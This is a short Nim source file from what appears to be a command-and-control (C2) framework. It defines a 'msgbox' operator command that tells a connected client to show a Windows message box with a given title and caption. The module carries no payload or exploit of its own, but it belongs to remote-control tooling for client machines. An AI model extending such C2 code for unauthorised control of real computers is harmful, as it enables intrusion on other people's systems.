import asyncdispatch, strutils

import ../../types

import ../../../clientTasks/msgbox

proc execProc(args: seq[string], server: C2Server) {.async.} =
  let slashSplit = args[1..(len(args) - 1)].join(" ").split("/")
  discard await msgbox.sendTask(server.cli.handlingClient, slashSplit[1].strip(), slashSplit[0].strip())

let cmd*: Command = Command(
  execProc: execProc,
  name: "msgbox",
  argsLength: 4,
  usage: @["msgbox [title] / [caption]"],
  cliMode: @[ClientInteractMode],
  description: "Send a message box (Windows only)",
  category: CCClientInteraction,
  requiresConnectedClient: true
)